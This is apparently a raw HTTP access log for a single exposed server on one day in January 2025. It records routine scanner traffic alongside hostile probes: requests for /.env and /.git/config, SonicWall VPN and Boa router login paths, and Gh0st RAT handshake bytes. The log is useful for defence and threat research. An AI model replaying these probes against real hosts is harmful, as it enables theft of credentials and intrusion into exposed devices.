152.42.219.47 - - [08/Jan/2025:01:07:04 +0000] "\x16\x03\x01\x01\v\x01" 400 528 "-" "-"
175.195.144.72 - - [08/Jan/2025:01:16:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
218.157.114.154 - - [08/Jan/2025:01:24:07 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
121.132.34.11 - - [08/Jan/2025:01:40:41 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
91.223.3.201 - - [08/Jan/2025:01:40:43 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
35.203.210.61 - - [08/Jan/2025:01:42:55 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
195.3.223.55 - - [08/Jan/2025:02:07:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
165.22.154.185 - - [08/Jan/2025:02:21:24 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
161.35.98.203 - - [08/Jan/2025:02:21:25 +0000] "POST /wsman HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
161.35.98.203 - - [08/Jan/2025:02:21:26 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/wsman" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
45.33.119.139 - - [08/Jan/2025:02:21:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.61"
50.116.4.192 - - [08/Jan/2025:02:21:27 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:21:28 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:21:28 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET /auth.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET /auth1.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET /sslvpnLogin.html HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET /api/sonicos/tfa HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET /api/sonicos/auth HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/auth.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/auth1.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/sslvpnLogin.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/api/sonicos/auth" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
137.184.152.207 - - [08/Jan/2025:02:21:30 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92:80/api/sonicos/tfa" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36"
193.34.212.75 - - [08/Jan/2025:02:22:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
139.177.202.162 - - [08/Jan/2025:02:24:26 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:27 +0000] "Gh0st\xad" 400 528 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:30 +0000] "HELP" 400 528 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:30 +0000] "\x1b\x84\xd5\xb0]\xf4\xc4\x93\xc50\xc2X\x8c\xda\xb1\xd7\xac\xafn\x1d\xe1\x1e\x1a3*\x85\xb7\x1d'\xb1\xc9k\xbf\xf0\xbc\n" 400 528 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:32 +0000] "\x16\x03\x01" 400 528 "-" "-"
142.93.199.199 - - [08/Jan/2025:02:25:34 +0000] "\xbd\xff\x9e\xffE\xff\x9e\xff\xbd\xff\x9e\xff\xa4\xff\x86\xff\xc4\xff\xbe\xff\xc7\xff\xdb\xff\xee\xff\xd9\xff\xed\xff\xa4\xff\x9d\xff\xcf\xff\xd8\xff\xe5\xff\x04\xff\x12\xff0\xff\xb1\xff\xbd\xff\xe7\xff\xe2\xff\xdd\xff\xdc\xff\xde\xff\xc8\xff\xcc\xff\xbe\xff\xf8\xff&\xff\x01\xff\x0f\xff\xf5\xff\x06\xff\xff\xff\xf7\xff!\xff\xde\xff\x02\xff&\xff\x0c\xff\x01\xff\xf5\xff\n" 400 528 "-" "-"
179.43.191.146 - - [08/Jan/2025:02:26:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
50.116.4.192 - - [08/Jan/2025:02:27:37 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:27:37 +0000] "GET /js/brand.js HTTP/1.1" 200 569 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:27:37 +0000] "GET /js/login.js HTTP/1.1" 200 922 "http://34.89.130.92/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:27:37 +0000] "GET /js/utils/json-manipulator.js HTTP/1.1" 200 564 "http://34.89.130.92/js/brand.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
50.116.4.192 - - [08/Jan/2025:02:27:37 +0000] "GET /js/services/LoggerService.js HTTP/1.1" 200 1344 "http://34.89.130.92/js/login.js" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.61 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:02:48:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:02:48:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
102.217.121.78 - - [08/Jan/2025:02:52:20 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
87.121.79.3 - - [08/Jan/2025:03:02:50 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [08/Jan/2025:03:03:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [08/Jan/2025:03:14:55 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:03:14:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
14.40.42.144 - - [08/Jan/2025:03:21:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.178.110.57 - - [08/Jan/2025:03:42:47 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 11_0 like Mac OS X) AppleWebKit/604.1.38 (KHTML, like Gecko) Version/11.0 Mobile/15A356 Safari/604.1"
154.213.184.132 - - [08/Jan/2025:04:16:20 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
167.94.138.180 - - [08/Jan/2025:04:22:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.138.180 - - [08/Jan/2025:04:22:59 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.180 - - [08/Jan/2025:04:23:00 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.180 - - [08/Jan/2025:04:23:01 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.138.180 - - [08/Jan/2025:04:23:02 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
57.129.64.10 - - [08/Jan/2025:04:26:17 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; ModatScanner/1.0; +https://modat.io/)"
185.16.39.104 - - [08/Jan/2025:04:27:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [08/Jan/2025:05:09:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [08/Jan/2025:05:13:25 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:05:13:25 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.247.137.15 - - [08/Jan/2025:05:17:05 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
193.34.212.75 - - [08/Jan/2025:05:22:32 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.104.11.51 - - [08/Jan/2025:05:46:42 +0000] "\x16\x03\x01" 400 528 "-" "-"
185.242.226.10 - - [08/Jan/2025:06:01:37 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
139.59.146.86 - - [08/Jan/2025:06:15:15 +0000] "\x16\x03\x01\x01$\x01" 400 528 "-" "-"
78.153.140.148 - - [08/Jan/2025:06:34:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:06:34:06 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.82.219.124 - - [08/Jan/2025:06:43:54 +0000] "GET /.env HTTP/1.0" 302 350 "-" "Mozilla/5.0 (Windows NT 6.0; rv:40.0) Gecko/20100101 Firefox/40.0"
61.75.186.10 - - [08/Jan/2025:07:01:30 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
195.178.110.57 - - [08/Jan/2025:07:07:49 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 9; en-us; POCOPHONE F1 Build/PKQ1.180729.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.141 Mobile Safari/537.36 XiaoMi/MiuiBrowser/10.9.7-g"
45.84.143.10 - - [08/Jan/2025:07:31:25 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
198.235.24.145 - - [08/Jan/2025:07:33:25 +0000] "\x16\x03\x01" 400 528 "-" "-"
198.235.24.145 - - [08/Jan/2025:07:33:25 +0000] "\x16\x03\x01" 400 528 "-" "-"
97.87.38.112 - - [08/Jan/2025:07:51:06 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
87.120.115.119 - - [08/Jan/2025:07:51:21 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; Konqueror/4.5; Windows) KHTML/4.5.4 (like Gecko)"
147.185.132.189 - - [08/Jan/2025:08:14:55 +0000] "\x16\x03\x01" 400 528 "-" "-"
147.185.132.189 - - [08/Jan/2025:08:14:55 +0000] "\x16\x03\x01" 400 528 "-" "-"
78.153.140.148 - - [08/Jan/2025:08:16:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:08:16:57 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [08/Jan/2025:08:18:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
80.228.15.244 - - [08/Jan/2025:08:22:01 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
47.254.215.105 - - [08/Jan/2025:08:25:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "curl/7.64.1"
80.154.4.155 - - [08/Jan/2025:08:26:38 +0000] "\x16\x03\x01" 400 528 "-" "-"
80.154.4.155 - - [08/Jan/2025:08:26:38 +0000] "GET / HTTP/1.1" 200 1761 "-" "-"
46.19.138.234 - - [08/Jan/2025:08:30:52 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [08/Jan/2025:08:35:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
195.3.223.55 - - [08/Jan/2025:08:38:48 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
178.215.236.132 - - [08/Jan/2025:08:58:26 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (SymbianOS/9.2; U; Series60/3.1 Nokia5700/3.27; Profile/MIDP-2.0 Configuration/CLDC-1.1) AppleWebKit/413 (KHTML, like Gecko) Safari/413"
91.223.3.201 - - [08/Jan/2025:09:09:48 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
185.16.39.104 - - [08/Jan/2025:09:16:19 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.133 - - [08/Jan/2025:09:24:10 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
206.168.34.210 - - [08/Jan/2025:09:31:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.210 - - [08/Jan/2025:09:31:22 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.210 - - [08/Jan/2025:09:31:23 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.210 - - [08/Jan/2025:09:31:23 +0000] "GET / HTTP/1.1" 200 966 "http://34.89.130.92/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.210 - - [08/Jan/2025:09:31:25 +0000] "PRI * HTTP/2.0" 400 528 "-" "-"
5.181.190.248 - - [08/Jan/2025:09:40:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
172.105.128.11 - - [08/Jan/2025:09:45:26 +0000] "\x16\x03\x01" 400 528 "-" "-"
3.145.188.182 - - [08/Jan/2025:09:47:02 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/126.0.0.0 Safari/537.36"
3.145.188.182 - - [08/Jan/2025:09:47:02 +0000] "\x16\x03\x01" 400 528 "-" "-"
221.160.3.235 - - [08/Jan/2025:10:09:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
78.153.140.148 - - [08/Jan/2025:10:09:20 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:10:09:20 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
34.77.25.224 - - [08/Jan/2025:10:14:49 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
172.169.206.157 - - [08/Jan/2025:10:20:26 +0000] "GET /actuator/health HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
198.235.24.130 - - [08/Jan/2025:10:40:32 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
74.82.47.4 - - [08/Jan/2025:10:48:38 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Safari/537.36"
74.82.47.4 - - [08/Jan/2025:10:51:41 +0000] "GET /favicon.ico HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.901 Yowser/2.5  Safari/537.36"
74.82.47.4 - - [08/Jan/2025:10:53:00 +0000] "GET /geoserver/web/ HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.224 Safari/537.36"
104.152.52.206 - - [08/Jan/2025:10:59:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "masscan/1.3 (https://github.com/robertdavidgraham/masscan)"
78.153.140.148 - - [08/Jan/2025:11:04:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:11:04:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:11:50:45 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:11:50:47 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
139.59.146.86 - - [08/Jan/2025:11:52:51 +0000] "GET /query?q=SHOW+DIAGNOSTICS HTTP/1.1" 302 350 "-" "Go-http-client/1.1"
139.59.146.86 - - [08/Jan/2025:11:52:51 +0000] "GET / HTTP/1.1" 200 1742 "http://34.89.130.92:80/query?q=SHOW+DIAGNOSTICS" "Go-http-client/1.1"
93.174.93.12 - - [08/Jan/2025:11:54:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (OS/2; Warp 4.5; rv:38.0) Gecko/20100101 Firefox/38.0"
110.44.239.44 - - [08/Jan/2025:12:03:21 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [08/Jan/2025:12:17:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
50.114.203.187 - - [08/Jan/2025:12:40:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
50.114.203.187 - - [08/Jan/2025:12:40:05 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
81.163.51.205 - - [08/Jan/2025:13:10:53 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:14:14:36 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:14:14:36 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
64.62.197.205 - - [08/Jan/2025:14:19:05 +0000] "\x16\x03\x01" 400 528 "-" "-"
154.213.184.132 - - [08/Jan/2025:14:26:08 +0000] "CONNECT google.com:443 HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
154.213.187.172 - - [08/Jan/2025:14:33:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 302 387 "http://34.89.130.92:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
46.19.138.234 - - [08/Jan/2025:14:37:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
220.70.68.223 - - [08/Jan/2025:14:43:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [08/Jan/2025:14:46:56 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
81.161.238.40 - - [08/Jan/2025:14:57:24 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.100 Safari/537.36"
179.43.191.146 - - [08/Jan/2025:14:58:05 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
118.34.195.16 - - [08/Jan/2025:15:02:36 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.34.212.75 - - [08/Jan/2025:15:33:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [08/Jan/2025:15:53:10 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [08/Jan/2025:15:53:10 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
220.84.109.26 - - [08/Jan/2025:16:13:54 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
119.201.114.194 - - [08/Jan/2025:16:21:11 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
139.59.101.104 - - [08/Jan/2025:16:28:43 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
